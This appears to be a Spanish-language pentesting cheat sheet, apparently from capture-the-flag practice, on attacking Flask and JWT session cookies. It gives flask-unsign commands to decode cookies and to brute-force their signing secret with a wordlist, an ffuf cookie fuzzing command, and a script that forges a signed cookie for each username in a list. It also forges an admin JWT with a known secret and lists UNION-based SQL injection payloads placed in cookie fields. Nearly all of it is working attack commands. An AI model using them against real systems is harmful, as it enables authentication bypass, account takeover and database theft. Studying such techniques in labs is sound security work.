

# JWT

## ENUMERACIÓN
### CONTENIDO DEL JWT
```shell
❯ pip3 install flask-unsign --break-system-packages
❯ flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiZ29ya2EifQ.ZyEVpA.7YzfRb0IbiEal6IQICTjI3Uko2U'
```

### FUZZ DE COOKIES
```shell
ffuf -u 'http://10.10.11.160:5000/dashboard' -H 'Cookie: session=FUZZ' -w cookies.txt - mc 200
```


# BRUTE FORCE JWT
### CON FLASK
```shell
❯ flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiZ29ya2EifQ.ZyEVpA.7YzfRb0IbiEal6IQICTjI3Uko2U' --no-literal-eval
```

### CON SCRIPT
```python
import os
for user in open('/usr/share/seclists/Usernames/Names/names.txt').readlines():
 user = user.rstrip()
 cmd = "flask-unsign --sign --cookie \"{'logged_in': True, 'username':'"+user+"'}\" --secret secret123"
 cookie = os.system(cmd)
```


# CREAR JWT
### CON FLASK
```shell
❯ flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret 'secret123'
```

### CON PYTHON
```PYTHON
❯ python3
Python 3.11.2 (main, Sep 14 2024, 03:00:30) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import jwt
>>> jwt.encode({"username":"admin"},'RrXCv`mrNe!K!4+5`wYq',algorithm='HS256')
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4'
```



# SQLI EN COOKIE

```sql
#COOKIE NORMAL
{"CRAAFTKP":"1", "7DA8SKYP": "1"} 

#UNION SELECT
{"CRAAFTKP'UNION SELECT 1#":"1"}
-----------------------------------
{"CRAAFTKP' UNION SELECT 1,2#":"1"}

#LIMIT
{"CRAAFTKP' UNION SELECT 1,2,3 LIMIT 1,1#":"1"}

#VERSION
{"CRAAFTKP' UNION SELECT 1,version(),3 limit 1,1#":"2"}
```